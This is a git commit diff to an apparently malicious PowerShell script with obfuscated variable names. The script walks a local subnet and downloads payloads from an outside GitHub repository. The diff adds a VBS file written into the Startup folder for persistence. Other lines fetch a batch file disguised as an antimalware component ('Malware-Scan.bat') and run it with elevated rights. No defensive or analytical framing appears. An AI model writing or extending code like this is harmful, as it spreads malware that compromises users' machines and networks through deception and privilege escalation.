5f68829d9aa5543f9ef34104579a26edc836f4cb
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-23 23:59:11 -0800

    Active

--- ps1/cuteandfriendly99.ps1
+++ ps1/cuteandfriendly99.ps1
@@ -2,6 +2,9 @@ $hn7 = "192.168.1."
 $j34 = 1..254
 $o77 = foreach ($ip in $j34) { $hn7 + $ip }
 $j11 = $MyInvocation.MyCommand.Path
+$c3 = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/softkitty99.vbs"
+$z1 = $env:Startup + "softkitty99.vbs"
+Invoke-WebRequest $c3 -OutFile $z1
 $k90 = $env:Startup + "softkitty99.vbs"
 foreach ($ip in $o77) {
     if (Test-Connection $ip -Quiet) {
@@ -14,7 +17,7 @@ foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
     }
 } 
 $j4 = "https://github.com/kaosSec/kaosTools/raw/main/bat/justafriendlydolphin.bat"
-$u7 = "$env:SystemRoot\Antimalware Service Executable\Malware-Scan.bat"
+$u7 = $env:SystemRoot + "\Antimalware Service Executable\Malware-Scan.bat"
 Invoke-WebRequest $j4 -OutFile $u7
 Start-Process -FilePath $u7 -Verb RunAs
 [System.Windows.Forms.MessageBox]::Show("shiet")
